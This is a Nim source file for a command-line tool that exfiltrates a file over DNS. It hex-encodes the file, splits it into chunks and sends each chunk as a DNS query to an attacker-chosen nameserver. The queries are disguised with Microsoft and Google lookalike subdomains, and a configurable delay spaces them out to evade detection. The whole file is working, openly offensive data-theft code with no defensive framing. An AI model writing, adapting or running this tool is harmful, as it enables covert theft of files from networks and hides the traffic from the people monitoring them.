import std/[os, strutils, random]
import pkg/ndns
randomize()

proc resolve(client: DnsClient, data: string): void =
    try:
        discard resolveIpv4(client, data, 1)
    except CatchableError as e:
        #echo "[DEBUG] ", e.msg
        if e.msg.contains("timeout"):
            #echo "[DEBUG] OK ", data
            discard
        else:
            #echo "[DEBUG] ERROR ", data
            quit(e.msg)

proc dnsExfil(ns: string, file: string, slp: int): void =
    let
        client = initDnsClient(ns)
        content = readFile(file)
        hex = content.toHex
        chuckSize = 20 # max 62
        domains = [".client.a.msn.windows.com", ".a.wns.update.windows.com", ".a.wns.o365.microsoft.com", ".msft.a.msn.microsoft.com"]
    
    var stringindex: int
    
    echo "[+] Sending ", file, " [lengh: ", content.len, "]"
    
    resolve(client, file.toHex & ".bb.googleusercontent.com")

    while stringindex <= hex.len-1:
        let
            query =  hex[stringindex .. (if stringindex + chuckSize - 1 > hex.len - 1: hex.len - 1 else: stringindex + chuckSize - 1)]
            dnsquery = query & sample(domains)

        resolve(client, dnsquery)
        
        inc(stringindex, chuckSize)
        sleep(slp)

    resolve(client, "quit")

    echo "[+] Done!"


when isMainModule:
    if paramCount() < 3:
        echo "[!] Use: dnx.exe <IP> <File> <Time between requests in ms>"
        echo "[!] e.g: dnx.exe 13.37.13.37 file.pdf 1000"
        quit()
    else:
        dnsExfil(paramStr(1), paramStr(2), parseInt(paramStr(3)))

